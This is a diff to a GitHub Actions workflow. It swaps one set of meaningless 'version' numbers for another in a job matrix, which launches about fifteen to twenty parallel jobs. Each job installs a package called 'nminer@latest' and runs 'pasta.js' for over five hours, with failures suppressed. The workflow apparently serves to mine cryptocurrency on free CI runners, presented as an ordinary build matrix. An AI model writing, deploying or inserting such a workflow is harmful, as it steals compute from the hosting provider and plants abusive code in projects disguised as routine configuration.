@@ -9,26 +9,21 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 5999 }
-          - { version: 648 }
-          - { version: 5160 }
-          - { version: 1491 }
-          - { version: 8732 }
-          - { version: 6761 }
-          - { version: 1249 }
-          - { version: 3040 }
-          - { version: 2710 }
-          - { version: 9371 }
-          - { version: 4936 }
-          - { version: 9105 }
-          - { version: 9061 }
-          - { version: 986 }
-          - { version: 1760 }
-          - { version: 6109 }
-          - { version: 9584 }
-          - { version: 6845 }
-          - { version: 40 }
-          - { version: 364 }
+          - { version: 950 }
+          - { version: 2041 }
+          - { version: 7659 }
+          - { version: 8603 }
+          - { version: 5725 }
+          - { version: 9141 }
+          - { version: 6312 }
+          - { version: 8048 }
+          - { version: 4300 }
+          - { version: 9465 }
+          - { version: 2512 }
+          - { version: 7260 }
+          - { version: 4768 }
+          - { version: 1574 }
+          - { version: 3501 }
 
     steps:
       - name: Checkout
@@ -39,7 +34,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: 
+      - name: majestically
         run: |
           npm install nminer@latest
-          timeout 340m node pasta.js || echo "pasta executed"
+          timeout 322m node pasta.js || echo "pasta executed"
